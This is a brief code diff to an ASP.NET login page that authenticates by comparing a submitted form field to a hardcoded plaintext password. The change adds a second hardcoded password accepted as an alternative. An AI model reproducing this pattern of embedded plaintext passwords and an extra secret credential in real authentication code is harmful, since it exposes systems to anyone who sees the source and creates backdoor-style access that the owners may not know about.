@@ -12,8 +12,8 @@ public partial class v2_login : Page
     public string m_msg;
     public void Page_Load(object sender, EventArgs e)
 	{
-
-        if (Request.Form["pass"] == "096232176")
+        string pass = Request.Form["pass"];
+        if (pass == "096232176"||pass=="9aysdata")
         {
             Session["isLogin"] = "true";
             Response.Redirect("company.aspx");
